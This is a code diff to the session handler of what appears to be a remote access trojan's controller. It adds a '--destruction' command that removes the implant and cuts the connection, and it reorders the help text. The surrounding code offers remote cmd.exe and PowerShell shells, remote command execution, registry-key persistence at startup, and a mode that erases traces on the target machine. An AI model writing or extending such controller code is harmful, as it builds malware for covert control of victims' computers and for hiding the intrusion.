@@ -40,13 +40,15 @@ class Session:
         printColor("help","""
 -h or --help : Displays all session mode commands.
 
+-c : Executes a command and returns the result.(Don't forget to put the command in double quotes). 
+
 --command : Start a command prompt (cmd.exe) on the remote machine.
 
 --powershell : Start the powershell on the remote machine.
 
--c : Executes a command and returns the result.(Don't forget to put the command in double quotes). 
-
 -p or --persistence : Makes the client persistent at startup by changing the registry keys.
+
+--destruction : Supprime le client  sur la machine distance et coupe la connexion.
 
 -b or --back : Back to menu.
 """) 
@@ -109,14 +111,14 @@ class Session:
 
     
     def lonelyDestruction(self):
-        '''-d or --destruction '''
+        '''--destruction '''
         #send MOD_DESTRUCTION | stop the connection and then remove all traces on the target machine.
 
         mod_destruction  = "MOD_DESTRUCTION:"
         if(CheckConn().sendsafe(self.session_nb, self.socket, mod_destruction)):
             
             reponse = CheckConn().recvsafe(self.socket, 4096)
-            printColor("information",reponse)
+            printColor("information","---->"+reponse)
         
         else:
             printColor("error", "[+] the destruction mod was not sent.\n")
@@ -144,6 +146,10 @@ class Session:
                     elif  terminal[i] == "--powershell":
                         self.spawnShell("powershell.exe")
                     
+                    elif terminal[i] == "--destruction":
+                        self.lonelyDestruction()
+
+
                     elif terminal[i] == "-c":
                         self.executeCommand(terminal)
 
@@ -153,9 +159,6 @@ class Session:
                     elif terminal[i] == "-p" or terminal[i] == "--persistence":
                         self.lonelyPersistence()
                     
-                    elif terminal[i] == "-d" or terminal[i] == "--destruction":
-                        self.lonelyDestruction()
-
                     else:
                         pass
                     
